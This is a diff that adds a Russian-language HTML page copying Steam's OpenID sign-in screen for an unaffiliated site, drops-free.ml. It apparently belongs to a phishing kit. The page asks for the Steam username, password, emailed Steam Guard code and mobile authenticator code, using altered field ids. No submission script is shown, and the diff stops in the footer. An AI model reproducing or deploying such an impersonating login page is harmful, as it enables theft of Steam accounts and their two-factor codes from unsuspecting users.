@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html class=" responsive" lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+			<meta name="viewport" content="width=device-width,initial-scale=1">
+		<meta name="theme-color" content="#171a21">
+		<title>Сообщество Steam</title>
+	<link rel="shortcut icon" href="../../steamcommunity.com/favicon.ico" type="image/x-icon">
+
+	<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/motiva_sans.css" rel="stylesheet" type="text/css">
+<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/buttons.css" rel="stylesheet" type="text/css">
+<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/shared_global.css" rel="stylesheet" type="text/css">
+<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/globalv2.css" rel="stylesheet" type="text/css">
+<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/home.css" rel="stylesheet" type="text/css">
+<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/login.css" rel="stylesheet" type="text/css">
+<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/openid.css" rel="stylesheet" type="text/css">
+<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/motiva_sans.css" rel="stylesheet" type="text/css">
+<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/shared_responsive.css" rel="stylesheet" type="text/css">
+<link href="Сооб�%2589е�%2581�%2582во&#32;Steam_files/header.css" rel="stylesheet" type="text/css">
+		
+			
+
+
+
+	
+						<meta property="fb:app_id" content="105386699540688">
+			
+	
+			<link rel="image_src" href="../../steamcommunity-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
+		<meta property="og:image" content="https://steamcommunity-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
+					<meta property="og:image:secure" content="https://steamcommunity-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
+			
+	
+	
+	</head>
+<body class=" responsive_page">
+
+<div class="responsive_page_frame with_header">
+
+						<div class="responsive_page_menu_ctn mainmenu">
+				<div class="responsive_page_menu" id="responsive_page_menu">
+										<div class="mainmenu_contents">
+						<div class="mainmenu_contents_items">
+															<a class="menuitem" href="../../steamcommunity.com/login/home/index.html%3Fgoto=openid%252Flogin.html">
+									Войти								</a>
+								<a class="menuitem supernav" href="../../store.steampowered.com/index.html" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
+		Магазин	</a>
+	<div class="submenu_store" style="display: none;" data-submenuid="store">
+		<a class="submenuitem" href="../../store.steampowered.com/index.html">Популярное</a>
+		<a class="submenuitem" href="../../store.steampowered.com/explore/index.html">Введение</a>
+		<a class="submenuitem" href="../../store.steampowered.com/curators/index.html">Кураторы</a>
+		<a class="submenuitem" href="../../steamcommunity.com/my/wishlist/index.html">Список желаемого</a>
+		<a class="submenuitem" href="../../store.steampowered.com/news/index.html">Новости</a>
+		<a class="submenuitem" href="../../store.steampowered.com/stats/index.html">Статистика</a>
+	</div>
+
+
+	<a class="menuitem supernav" style="display: block" href="../../steamcommunity.com/index.html" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
+		Сообщество	</a>
+	<div class="submenu_community" style="display: none;" data-submenuid="community">
+		<a class="submenuitem" href="../../steamcommunity.com/index.html">Главная</a>
+		<a class="submenuitem" href="../../steamcommunity.com/discussions/index.html">Обсуждения</a>
+		<a class="submenuitem" href="../../steamcommunity.com/workshop/index.html">Мастерская</a>
+		<a class="submenuitem" href="../../steamcommunity.com/market/index.html">Торговая площадка</a>
+		<a class="submenuitem" href="../../steamcommunity.com/index.html%3Fsubsection=broadcasts.html">Трансляции</a>
+					</div>
+
+	
+
+	
+	
+	<a class="menuitem" href="../../help.steampowered.com/ru/index.html">
+		Поддержка	</a>
+
+							<div class="minor_menu_items">
+																<div class="menuitem change_language_action">
+									Изменить язык								</div>
+																									<div class="menuitem" onclick="Responsive_RequestDesktopView();">
+										Полная версия									</div>
+															</div>
+						</div>
+						<div class="mainmenu_footer_spacer"></div>
+						<div class="mainmenu_footer">
+							<div class="mainmenu_footer_logo"><img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/logo_valve_footer.png"></div>
+							© Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.							<span class="mainmenu_valve_links">
+								<a href="../../store.steampowered.com/privacy_agreement/index.html" target="_blank">Privacy Policy</a>
+								&nbsp;| &nbsp;<a href="../../www.valvesoftware.com/legal.htm" target="_blank">Legal</a>
+								&nbsp;| &nbsp;<a href="../../store.steampowered.com/subscriber_agreement/index.html" target="_blank">Steam Subscriber Agreement</a>
+								&nbsp;| &nbsp;<a href="../../store.steampowered.com/steam_refunds/index.html" target="_blank">Refunds</a>
+							</span>
+						</div>
+					</div>
+									</div>
+			</div>
+		
+		<div class="responsive_local_menu_tab">
+
+		</div>
+
+		<div class="responsive_page_menu_ctn localmenu">
+			<div class="responsive_page_menu" id="responsive_page_local_menu">
+				<div class="localmenu_content">
+				</div>
+			</div>
+		</div>
+
+
+
+					<div class="responsive_header">
+				<div class="responsive_header_content">
+					<div id="responsive_menu_logo">
+						<img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/header_menu_hamburger.png" height="100%">
+											</div>
+					<div class="responsive_header_logo">
+						<img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/header_logo.png" height="36" border="0" alt="STEAM">
+					</div>
+				</div>
+			</div>
+		
+		<div class="responsive_page_content_overlay">
+
+		</div>
+
+		<div class="responsive_fixonscroll_ctn nonresponsive_hidden ">
+		</div>
+	
+	<div class="responsive_page_content">
+
+		<div id="global_header">
+	<div class="content">
+		<div class="logo">
+			<span id="logo_holder">
+									<a href="../../store.steampowered.com/index.html">
+						<img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/globalheader_logo.png" width="176" height="44">
+					</a>
+							</span>
+			<!--[if lt IE 7]>
+			<style type="text/css">
+				#logo_holder img { filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0); }
+				#logo_holder { display: inline-block; width: 176px; height: 44px; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="https://steamcommunity-a.akamaihd.net/public/images/v5/globalheader_logo.png"); }
+			</style>
+			<![endif]-->
+		</div>
+
+			<div class="supernav_container">
+	<a class="menuitem supernav" href="../../store.steampowered.com/index.html" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
+		МАГАЗИН	</a>
+	<div class="submenu_store" style="display: none;" data-submenuid="store">
+		<a class="submenuitem" href="../../store.steampowered.com/index.html">Популярное</a>
+		<a class="submenuitem" href="../../store.steampowered.com/explore/index.html">Введение</a>
+		<a class="submenuitem" href="../../store.steampowered.com/curators/index.html">Кураторы</a>
+		<a class="submenuitem" href="../../steamcommunity.com/my/wishlist/index.html">Список желаемого</a>
+		<a class="submenuitem" href="../../store.steampowered.com/news/index.html">Новости</a>
+		<a class="submenuitem" href="../../store.steampowered.com/stats/index.html">Статистика</a>
+	</div>
+
+
+	<a class="menuitem supernav" style="display: block" href="../../steamcommunity.com/index.html" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
+		СООБЩЕСТВО	</a>
+	<div class="submenu_community" style="display: none;" data-submenuid="community">
+		<a class="submenuitem" href="../../steamcommunity.com/index.html">Главная</a>
+		<a class="submenuitem" href="../../steamcommunity.com/discussions/index.html">Обсуждения</a>
+		<a class="submenuitem" href="../../steamcommunity.com/workshop/index.html">Мастерская</a>
+		<a class="submenuitem" href="../../steamcommunity.com/market/index.html">Торговая площадка</a>
+		<a class="submenuitem" href="../../steamcommunity.com/index.html%3Fsubsection=broadcasts.html">Трансляции</a>
+					</div>
+
+	
+
+	
+			<a class="menuitem" href="../../store.steampowered.com/about/index.html">
+			О STEAM		</a>
+	
+	<a class="menuitem" href="../../help.steampowered.com/ru/index.html">
+		ПОДДЕРЖКА	</a>
+	</div>
+	
+
+		<div id="global_actions">
+			<div id="global_action_menu">
+									<div class="header_installsteam_btn header_installsteam_btn_green">
+						<div class="header_installsteam_btn_leftcap"></div>
+						<div class="header_installsteam_btn_rightcap"></div>
+
+						<a class="header_installsteam_btn_content" href="../../store.steampowered.com/about/index.html">
+							Установить Steam						</a>
+					</div>
+				
+				
+														<a class="global_action_link" href="../../steamcommunity.com/login/home/index.html%3Fgoto=openid%252Flogin.html">войти</a>
+					&nbsp;|&nbsp;
+					<span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, &#39;language_dropdown&#39;, &#39;right&#39; );">язык</span>
+					<div class="popup_block_new" id="language_dropdown" style="display: none;">
+						<div class="popup_body popup_menu">
+																																	<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=bulgarian.html" onclick="ChangeLanguage( &#39;bulgarian&#39; ); return false;">Български (болгарский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=czech.html" onclick="ChangeLanguage( &#39;czech&#39; ); return false;">Cestina (чешский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=danish.html" onclick="ChangeLanguage( &#39;danish&#39; ); return false;">Dansk (датский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=dutch.html" onclick="ChangeLanguage( &#39;dutch&#39; ); return false;">Nederlands (нидерландский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=english.html" onclick="ChangeLanguage( &#39;english&#39; ); return false;">English (английский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=finnish.html" onclick="ChangeLanguage( &#39;finnish&#39; ); return false;">Suomi (финский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=french.html" onclick="ChangeLanguage( &#39;french&#39; ); return false;">Francais (французский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=german.html" onclick="ChangeLanguage( &#39;german&#39; ); return false;">Deutsch (немецкий)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=greek.html" onclick="ChangeLanguage( &#39;greek&#39; ); return false;">???????? (греческий)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=hungarian.html" onclick="ChangeLanguage( &#39;hungarian&#39; ); return false;">Magyar (венгерский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=italian.html" onclick="ChangeLanguage( &#39;italian&#39; ); return false;">Italiano (итальянский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=japanese.html" onclick="ChangeLanguage( &#39;japanese&#39; ); return false;">??? (японский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=koreana.html" onclick="ChangeLanguage( &#39;koreana&#39; ); return false;">??? (корейский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=norwegian.html" onclick="ChangeLanguage( &#39;norwegian&#39; ); return false;">Norsk (норвежский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=polish.html" onclick="ChangeLanguage( &#39;polish&#39; ); return false;">Polski (польский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=portuguese.html" onclick="ChangeLanguage( &#39;portuguese&#39; ); return false;">Portugues (португальский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=brazilian.html" onclick="ChangeLanguage( &#39;brazilian&#39; ); return false;">Portugues-Brasil (бразильский португальский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=romanian.html" onclick="ChangeLanguage( &#39;romanian&#39; ); return false;">Romana (румынский)</a>
+																																			<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=schinese.html" onclick="ChangeLanguage( &#39;schinese&#39; ); return false;">???? (упрощенный китайский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=spanish.html" onclick="ChangeLanguage( &#39;spanish&#39; ); return false;">Espanol (испанский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=swedish.html" onclick="ChangeLanguage( &#39;swedish&#39; ); return false;">Svenska (шведский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=tchinese.html" onclick="ChangeLanguage( &#39;tchinese&#39; ); return false;">???? (традиционный китайский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=thai.html" onclick="ChangeLanguage( &#39;thai&#39; ); return false;">??? (тайский)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=turkish.html" onclick="ChangeLanguage( &#39;turkish&#39; ); return false;">Turkce (турецкий)</a>
+																										<a class="popup_menu_item tight" href="../../steamcommunity.com/openid/login%3Fl=ukrainian.html" onclick="ChangeLanguage( &#39;ukrainian&#39; ); return false;">Українська (украинский)</a>
+																						<a class="popup_menu_item tight" href="../../translation.steampowered.com/index.html" target="_blank">Помогите нам с переводом Steam</a>
+						</div>
+					</div>
+							</div>
+					</div>
+			</div>
+</div>
+
+
+<div id="mainBody">
+	<div class="OpenID_MainHeader">
+				<div class="logo"><img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/sits_landing.png" width="114" height="43" border="0"></div>
+				<h1>Войти с помощью вашего аккаунта Steam на drops-free.ml</h1>
+
+					<div>
+				<div style="float:left; padding: 6px 6px 20px 18px">
+					<img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/icon_info.png" width="26" height="26" border="0">
+				</div>
+				<h2>Обратите внимание: Steam и Valve не имеют отношения к drops-free.ml</h2>
+			</div>
+		
+	</div>
+
+
+	<div class="OpenID_LowerContents">
+
+
+		<div class="OpenIDCol right">
+			<div class="OpenID_LowerContents_right">
+				<h2>Если вы войдете на drops-free.ml через Steam:</h2>
+				<ul class="OpenID_list">
+										<li class="OpenID_listitem">
+						Учётные данные вашего аккаунта Steam не будут переданы третьим лицам.					</li><li class="OpenID_listitem">
+						Уникальный цифровой идентификатор будет передан <a class="whiteLink OpenID_Highlight" href="../index.html"> drops-free.ml</a>. Благодаря этому drops-free.ml сможет идентифицировать ваш профиль Steam и получит доступ к той информации о нём, которую вы <a class="whiteLink" href="../../steamcommunity.com/my/edit/settings.html">сделали общедоступной</a>.					</li><li class="OpenID_listitem">
+						drops-free.ml получит доступ к любой общедоступной информации из <a class="whiteLink" href="../../steamcommunity.com/my/profile.html">вашего профиля</a> Steam.				</li></ul>
+				<h2>Нажав «Войти», вы соглашаетесь на передачу этих данных.</h2>
+			</div>
+		</div>
+
+		<div class="OpenIDCol left">
+			<div class="OpenID_LowerContents_left">
+				<div id="error_display" style="display: none;"></div>
+				<br>
+			
+										
+							<input type="hidden" name="emailauth" id="emailauth" value="">
+							<input type="hidden" name="emailsteamid" id="emailsteamid">
+							<input type="hidden" name="loginfriendlyname" id="loginfriendlyname" value="">
+							<div>Имя пользователя</div>
+							<input class="textField" type="text" name="username" id="steamAccountName" autofocus="" maxlength="64"><br>
+							&nbsp;
+							<br>
+							<div>Пароль</div>
+							<input class="textField" type="password" name="password" id="steamPassword" autocomplete="off" maxlength="64"><br>
+							<br>
+							<div id="captcha_entry" class="captcha_oauth" style="display: none;">
+								<input type="hidden" id="captchagid" name="captchagid" value="-1">
+								<div id="CaptchaFormArea">
+								<div>Введите эти символы ниже</div>
+								<img id="captchaImg" src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/captcha.php.html" border="0"><br>
+								<div id="captchaRefresh"><img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/blue_refresh_icon.png" id="captchaRefreshImg" border="0" onclick="RefreshCaptcha();return false;">&nbsp;<a href="../../steamcommunity.com/openid/login.html#" id="captchaRefreshLink" title="Refresh" onclick="RefreshCaptcha();return false;">Refresh</a></div>
+								<input class="textField" type="text" name="captcha_text" id="input_captcha" autocomplete="off"><br>
+								<div class="smallLabel" id="captchaExplanation">Вы человек или робот?</div>
+								<br>
+								</div>
+							</div>
+							<div id="login_btn_signin">
+								<input class="btn_green_white_innerfade" type="submit" name="btn" id="imageLogin" style="width:104px; height:34px; border:none; font-size: 15px;" value="Войти">
+							</div>
+							<br>
+							<div id="login_btn_wait" style="display: none;">
+								<img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/throbber.gif">
+							</div>
+							<br clear="all">
+						<div class="newmodal-err" style="display: none;"><div class="newmodal_header_border"><div class="newmodal_header"><div class="newmodal_close"></div><div class="ellipsis">Information</div></div></div><div class="newmodal_content_border"><div class="newmodal_content"  style="max-height: 674px;"><div id="nmce"><img src="Сооб�%2589е�%2581�%2582во&#32;Steam_files/throbber.gif"></div><div class="newmodal_buttons"><div id="closenm" class="btn_grey_white_innerfade btn_medium"><span>OK</span></div></div></div></div></div>
+						
+						
+						<div class="newmodal-email" style="display: none;"><div class="newmodal_header_border"><div class="newmodal_header"><div class="newmodal_close"></div><div class="ellipsis">Steam Guard</div></div></div><div class="newmodal_content_border"><div class="newmodal_content" style="max-height: 843px;"><div><div class="login_modal loginAuthCodeModal">
+		<form data-ajax="false">
+			<div class="auth_message_area">
+				<div class="auth_icon auth_icon_mail" id="auth_icon">
+				</div>
+				<div class="auth_messages" id="auth_messages">
+					<div class="auth_message" id="auth_message_entercode">
+						<div class="auth_modal_h1">Здравствуйте!</div>
+						<p>Похоже, вы пытаетесь войти в Steam через другой браузер или с другого компьютера. Или просто давно не заходили в свой аккаунт…</p>
+					</div>
+					<div class="auth_message" id="auth_message_checkspam" style="display: none;">
+						<div class="auth_modal_h1">Может быть, оно попало в спам?</div>
+						<p>Если вы не нашли письмо от службы поддержки Steam на своей электронной почте, проверьте папку со спамом.</p>
+					</div>
+					<div class="auth_message" id="auth_message_success" style="display: none;">
+						<div class="auth_modal_h1">Готово!</div>
+						<p>Вы получили доступ к своему аккаунту Steam.</p>
+					</div>
+					<div class="auth_message" id="auth_message_incorrectcode" style="display: none;">
+						<div class="auth_modal_h1">Ой!</div>
+						<p>Извините, <br>но он неверен...</p>
+					</div>
+					<div class="auth_message" id="auth_message_help" style="display: none;">
+						<div class="auth_modal_h1">Позвольте помочь вам!</div>
+						<p>Сожалеем, что вы испытываете трудности. Мы понимаем, что вы цените свой аккаунт Steam, поэтому постараемся помочь вам сохранить доступ к нему.</p>
+					</div>
+				</div>
+			</div>
+			<div class="auth_details_messages" id="auth_details_messages">
+				<div class="auth_details" id="auth_details_entercode">
+					В качестве меры безопасности аккаунта вам надо будет дать доступ этому браузеру, введя код, который мы отправили на ваш адрес эл. почты <span id="emailauth_entercode_emaildomain">mailforspam.com</span>.				</div>
+				<div class="auth_details" id="auth_details_success" style="display: none;">
+					Если это не ваш компьютер, перед уходом не забудьте выйти из своего аккаунта.				</div>
+				<div class="auth_details" id="auth_details_help" style="display: none;">
+					Пожалуйста, обратитесь в службу поддержки Steam. Решение проблем с доступом к аккаунту — наша основная задача.				</div>
+			</div>
+			<div class="authcode_entry_area">
+				<div id="authcode_entry">
+					<div class="authcode_entry_box">
+						<input class="authcode_entry_input authcode_placeholder" id="twofactorcode_entry" type="text" placeholder="введите код здесь" value="">
+
+					</div>
+				</div>
+				<div id="authcode_help_supportlink" style="display: none;">
+					<a href="../../support.steampowered.com/kb_article.php%3Fref=4020-ALZM-5519.html" data-ajax="false" data-externallink="1">Свяжитесь со службой поддержки Steam, чтобы вернуть доступ к аккаунту</a>
+				</div>
+			</div>
+			<div class="modal_buttons" id="auth_buttonsets">
+				<div class="auth_buttonset" id="auth_buttonset_entercode">
+					<div id="butguard" class="auth_button leftbtn" data-modalstate="submit">
+						<div class="auth_button_h3">Отправить</div>
+						<div class="auth_button_h5">мой код доступа</div>
+					</div>
+					<div class="auth_button" data-modalstate="checkspam">
+						<div class="auth_button_h3">Какое сообщение?</div>
+						<div class="auth_button_h5">Сообщение от поддержки Steam не пришло…</div>
+					</div>
+					<div style="clear: left;"></div>
+				</div>
+				<div class="auth_buttonset" id="auth_buttonset_checkspam" style="display: none;">
+					<div class="auth_button leftbtn" data-modalstate="submit">
+						<div class="auth_button_h3">Нашел!</div>
+						<div class="auth_button_h5">и ввел мой код доступа выше</div>
+					</div>
+					<div class="auth_button" data-modalstate="help">
+						<div class="auth_button_h3">До сих пор не нашел...</div>
+						<div class="auth_button_h5">Сообщение от службы поддержки Steam не пришло…</div>
+					</div>
+					<div style="clear: left;"></div>
+				</div>
+				<div class="auth_buttonset" id="auth_buttonset_success" style="display: none;">
+					<div class="auth_button auth_button_spacer">
+					</div>
+					<a class="auth_button" id="success_continue_btn" href="javascript:void(0);" data-modalstate="complete">
+						<div class="auth_button_h3">Перейти к Steam!</div>
+						<div class="auth_button_h5">&nbsp;<br>&nbsp;</div>
+					</a>
+					<div style="clear: left;"></div>
+				</div>
+				<div class="auth_buttonset" id="auth_buttonset_incorrectcode" style="display: none;">
+					<div class="auth_button leftbtn" data-modalstate="submit">
+						<div class="auth_button_h3">Повторить</div>
+						<div class="auth_button_h5">Я проверил код доступа выше</div>
+					</div>
+					<div class="auth_button" data-modalstate="help">
+						<div class="auth_button_h3">Помогите</div>
+						<div class="auth_button_h5">Мне нужна помощь службы поддержки Steam...</div>
+					</div>
+					<div style="clear: left;"></div>
+				</div>
+				<div class="auth_buttonset" id="auth_buttonset_waiting" style="display: none;">
+				</div>
+			</div>
+			<div class="auth_details_messages" id="auth_details_computer_name" style="">
+				Чтобы легко узнать этот браузер среди устройств, прошедших проверку Steam Guard, дайте ему подходящее имя длиной не менее шести символов.				<div class="friendly_name_box" id="friendly_name_box">
+					<input class="authcode_entry_input authcode_placeholder" id="friendlyname" type="text" placeholder="введите название">
+				</div>
+			</div>
+			<div style="display: none;">
+				<input type="submit" value="Подача запроса">
+			</div>
+		</form>
+	</div></div></div></div></div>
+						
+						
+						<!--2344444 style="position: fixed; z-index: 1000; max-width: 1823px; left: 250px; top: 160px;" 44444444444444!-->
+						<div class="newmodal_background" style="opacity: 0.8; display: none;"></div>
+						<div class="newmodal" style="display: none;"><div class="newmodal_header_border"><div class="newmodal_header"><div class="newmodal_close"></div><div class="ellipsis">Мобильная аутентификация Steam Guard</div></div></div><div class="newmodal_content_border"><div class="newmodal_content" style="max-height: 297px;"><div><div class="login_modal loginTwoFactorCodeModal" style="">
+		<form>
+		<div class="twofactorauth_message_area">
+			<div id="login_twofactorauth_icon" class="auth_icon auth_icon_phone">
+			</div>
+			<div class="twofactorauth_messages" id="login_twofactorauth_messages">
+				<div class="twofactorauth_message" id="login_twofactorauth_message_entercode" style="">
+					<div id="auth_modall" class="auth_modal_h1">Здравствуйте, <span id="login_twofactorauth_message_entercode_accountname"> </span>!</div>
+					<p id="never">Этот аккаунт находится под защитой мобильного аутентификатора Steam.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_incorrectcode" style="display: none;">
+					<div class="auth_modal_h1">Ой!</div>
+					<p>Извините, <br>но код неверен…</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp" style="display: none;">
+					<div class="auth_modal_h1">Позвольте помочь вам!</div>
+					<p>Сожалеем, что вы испытываете трудности. Мы понимаем, что вы цените свой аккаунт Steam, поэтому постараемся помочь вам сохранить доступ к нему.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove" style="display: none;">
+					<div class="auth_modal_h1">Подтвердите владение аккаунтом</div>
+					<p>Мы отправим СМС с кодом восстановления аккаунта на номер, заканчивающийся на <span id="login_twofactorauth_selfhelp_sms_remove_last_digits"></span>. Когда вы введёте код, мы удалим аутентификатор с вашего аккаунта, и вы будете получать коды Steam Guard по электронной почте.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_entercode" style="display: none;">
+					<div class="auth_modal_h1">Подтвердите владение аккаунтом</div>
+					<p>Мы отправили СМС с кодом подтверждения на ваш номер телефона, который заканчивается на <span id="login_twofactorauth_selfhelp_sms_remove_entercode_last_digits"></span>. Введите код ниже, чтобы мы могли удалить мобильный аутентификатор с вашего аккаунта.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_incorrectcode" style="display: none;">
+					<div class="auth_modal_h1">Ой!</div>
+					<p>Извините, <br>но код неверен…</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_removed" style="display: none;">
+					<div class="auth_modal_h1">Готово!</div>
+					<p>Мы удалили аутентификатор с вашего аккаунта. При следующем входе потребуется код Steam Guard, отправленный на вашу электронную почту.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_replaced" style="display: none;">
+					<div class="auth_modal_h1">Готово!</div>
+					<p>Теперь вы будете получать коды мобильного аутентификатора только на этот телефон.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_nosms" style="display: none;">
+					<div class="auth_modal_h1">У вас есть код восстановления?</div>
+					<p>К вашему аккаунту Steam не привязан номер телефона, поэтому подтвердить обладание аккаунтом с помощью СМС невозможно. Возможно, у вас остался код восстановления, который вы записали при добавлении мобильного аутентификатора. Он начинается с буквы R.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode" style="display: none;">
+					<div class="auth_modal_h1">Введите код восстановления</div>
+					<p>Пожалуйста, введите код восстановления ниже. Он начинается с буквы R.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode" style="display: none;">
+					<div class="auth_modal_h1">Ой!</div>
+					<p>Извините, <br>но код неверен…</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
+					<div class="auth_modal_h1">Ой!</div>
+					<p>Извините, <br>но код неверен…</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_message" style="display: none;">
+					<div class="auth_modal_h1">Ой!</div>
+					<p>Извините, <br>но код неверен…</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_couldnthelp" style="display: none;">
+					<div class="auth_modal_h1">Позвольте помочь вам!</div>
+					<p>Если вы потеряли доступ к мобильному устройству или номеру телефона, привязанному к аккаунту, а также не имеете кода восстановления, который записали при добавлении мобильного аутентификатора, свяжитесь со службой поддержки Steam, чтобы восстановить доступ к аккаунту.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_help" style="display: none;">
+					<div class="auth_modal_h1">Позвольте помочь вам!</div>
+					<p>Сожалеем, что вы испытываете трудности. Мы понимаем, что вы цените свой аккаунт Steam, поэтому постараемся помочь вам сохранить доступ к нему.</p>
+				</div>
+				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_failure" style="display: none;">
+					<div class="auth_modal_h1">Извините!</div>
+					<p>При обработке вашего запроса произошла ошибка.</p>
+				</div>
+			</div>
+		</div>
+		<div id="login_twofactorauth_details_messages" class="twofactorauth_details_messages">
+			<div class="twofactorauth_details" id="login_twofactorauth_details_entercode" style="">
+				Введите код из мобильного приложения Steam:			</div>
+			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp" style="display: none;">
+				Если вы потеряли доступ к мобильному устройству или удалили приложение Steam и больше не получаете коды, то можете удалить мобильный аутентификатор со своего аккаунта. Это снизит уровень безопасности, поэтому рекомендуем добавить аутентификатор на новом устройстве.			</div>
+			<div class="twofactorauth_details" id="login_twofactorauth_details_help" style="display: none;">
+				Пожалуйста, обратитесь в службу поддержки Steam.			</div>
+			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_failure" style="display: none;">
+			</div>
+			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode" style="display: none;">
+			</div>
+			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
+			</div>
+		</div>
+		<div class="twofactorauthcode_entry_area">
+			<div id="login_twofactor_authcode_entry">
+				<div class="twofactorauthcode_entry_box">
+					<input id="zazacode" class="twofactorauthcode_entry_input authcode_placeholder" type="text" placeholder="введите код здесь" autocomplete="off">
+				</div>
+			</div>
+			<div id="login_twofactor_authcode_help_supportlink" style="display: none;">
+				<a href="../../support.steampowered.com/kb_article.php%3Fref=4020-ALZM-5519.html">
+					Свяжитесь со службой поддержки Steam, чтобы вернуть доступ к аккаунту				</a>
+			</div>
+		</div>
+		<div class="modal_buttons" id="login_twofactorauth_buttonsets">
+			<div class="auth_buttonset" id="login_twofactorauth_buttonset_entercode" style="">
+				<div type="submit" class="auth_button leftbtn" data-modalstate="submit" id="butguard2">
+					<div class="auth_button_h3">Подтвердить</div>
+					<div class="auth_button_h5">код аутентификатора</div>
+				</div>
+				<div class="auth_button" data-modalstate="selfhelp">
+					<div class="auth_button_h3">Помогите,</div>
+					<div class="auth_button_h5">у меня больше нет доступа к кодам аутентификатора</div>
+				</div>
+				<div style="clear: left;"></div>
+			</div>
+		
+			<div class="auth_buttonset" id="login_twofactorauth_buttonset_waiting" style="display: none;">
+			</div>
+		</div>
+		<div style="display: none;">
+			<input type="submit">
+		</div>
+		</form>
+	</div></div></div></div></div>
+						
+						<br>
+						<p>Нет аккаунта в Steam? Вы можете <a class="whiteLink" target="_blank" href="../../store.steampowered.com/join/index.html">создать его</a> бесплатно.</p>
+					
+			</div>
+		</div>
+
+		<div style="clear: both"></div>
+
+	</div>
+
+</div>
+
+		</div>	<!-- responsive_page_legacy_content -->
+
+			<div id="footer_spacer"></div>
+	<div id="footer_responsive_optin_spacer"></div>
+	<div id="footer">
+		<div class="footer_content">
